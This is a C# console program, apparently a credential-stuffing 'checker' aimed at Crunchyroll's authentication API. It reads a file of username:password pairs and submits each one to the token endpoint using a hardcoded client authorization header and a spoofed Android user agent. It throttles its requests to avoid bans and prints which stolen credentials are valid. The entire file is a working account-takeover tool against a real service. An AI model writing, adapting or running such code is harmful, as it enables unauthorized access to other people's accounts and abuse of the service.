using System.Net.Http;
using System.Threading.Tasks;
using System.Net.Http.Headers;
class Program
{
    static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        var valid_values = 0;
        var invalid_values = 0;
        Console.Title = "valid values: " + valid_values + " | " + "invalid values: " + invalid_values;
        if (args[0] == null)
        {
            Console.WriteLine("please, move the exe for your cmd and put your db.txt dir file");
            return;
        }
        string[] argvalue = File.ReadAllLines(args[0]);
        for (int i = 0; i < argvalue.Length; i++)
        {
            Thread.Sleep(1000);
            string[] argsplit = argvalue[i].Split(':');
            string user = argsplit[0];
            string password = argsplit[1];
            var url = "https://beta-api.crunchyroll.com/auth/v1/token";
            var content = new StringContent($"username={user}&password={password}&grant_type=password&scope=offline_access&device_id=ece2d34d-15f3-4601-88d2-9c395aa273fa&device_name=SM-G955N&device_type=samsung%20SM-N976N", System.Text.Encoding.UTF8, "application/x-www-form-urlencoded");
            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Basic", "b2VkYXJteHN0bGgxanZhd2ltbnE6OWxFaHZIWkpEMzJqdVY1ZFc5Vk9TNTdkb3BkSnBnbzE="); //header
            client.DefaultRequestHeaders.UserAgent.ParseAdd("Crunchyroll/3.46.2 Android/9");//header
            HttpResponseMessage response = client.PostAsync(url, content).Result;
            string responseBody = response.Content.ReadAsStringAsync().Result;
            //Console.WriteLine(responseBody);
            //Console.ReadLine();
            if(responseBody.Equals("406 Not Acceptable"))
            {
                Console.WriteLine("you are banned from api");
                return;
            }
            string[] token = responseBody.Split(':', ',', '"');
            var acess_token = string.Empty;
            for (int j = 0; j < token.Length; j++)
            {

                if (token[j].Equals("access_token"))
                {
                    acess_token = token[j + 3];
                }
            }
            if (acess_token != string.Empty)
            {
                Console.WriteLine("valid! {0}", argvalue[i]);
                valid_values++;
                Console.Title ="valid values: " + valid_values + " | " + "invalid values: " + invalid_values;
            }
            else
            {
                Console.WriteLine("invalid! {0}", argvalue[i]);
                Console.Title = "valid values: " + valid_values + " | " + "invalid values: " + invalid_values;
            }
        }
        Console.WriteLine("checkagem finalizada!");
        Console.ReadLine();
    }
}